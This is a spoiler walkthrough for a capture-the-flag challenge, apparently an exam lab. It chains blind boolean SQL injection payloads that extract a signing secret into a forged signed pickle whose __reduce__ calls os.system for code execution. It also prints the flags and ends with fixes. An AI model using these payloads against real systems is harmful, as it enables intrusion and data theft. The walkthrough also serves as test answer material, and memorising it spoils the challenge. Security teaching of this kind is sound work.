# Walkthrough — Ledger  (SPOILERS)

**Chain:** blind boolean SQL injection → exfiltrate signing secret → forge signed pickle →

> Two flags — **FLAG1 (access):** stored in the DB, exfiltrated with the blind-SQLi oracle. **FLAG2 (proof):** forge a signed pickle for RCE (`/proof.txt`).
insecure deserialization → RCE → flag.

## 1. Blind SQL injection
`/api/status` builds its query by string formatting:
```python
q = "SELECT id FROM users WHERE username = '%s'" % username
```
It returns only `{"active": true|false}` — a boolean oracle. Inject a condition and read the boolean:
```
username = z' OR (SELECT length(value) FROM config WHERE key='secret')=27-- -
```
Binary-search the length, then each character:
```
z' OR (SELECT unicode(substr(value,POS,1)) FROM config WHERE key='secret')>MID-- -
```
That recovers the secret: `sup3r_s1gn1ng_s3cret_a1b2c3`. **This is the exam's signature skill** — turning
a one-bit oracle into full data exfiltration with a script.

## 2. The deserialization sink
The `/` route restores preferences from a signed cookie:
```python
expected = hmac.new(SECRET.encode(), data_b64.encode(), sha256).hexdigest()
if hmac.compare_digest(expected, sig):
    obj = pickle.loads(base64.b64decode(data_b64))   # code-execution sink
```
The HMAC stops *outsiders* from forging cookies — but we just stole `SECRET`. So we can sign anything,
and `pickle.loads()` executes it.

## 3. RCE
A class whose `__reduce__` returns `(os.system, (cmd,))` runs `cmd` during `pickle.loads()`:
```python
class RCE:
    def __reduce__(self):
        return (os.system, ("cat /proof.txt > /app/static/leak.txt",))
```
Base64 the pickle, HMAC-sign with the leaked secret, send as the `prefs` cookie, request `/`. The
command writes the flag into Flask's static dir; fetch `/static/leak.txt`:
```
→ FLAG2{pickle_deserialization_rce}
```

## Fixes
- Use **parameterised queries** everywhere. String-formatted SQL is the bug.
- Never `pickle.loads()` data that crosses a trust boundary, even signed. Use JSON for cookies/prefs.
- A leaked signing key turns "signed" into "attacker-controlled". Keep secrets out of the database and
  out of SQLi reach; rotate on exposure.

## Takeaways
- Blind SQLi is a scripting problem: build a reusable boolean/time oracle.
- "Signed therefore safe" fails the moment the key leaks — and deserialization behind a signature is
  still a deserialization bug.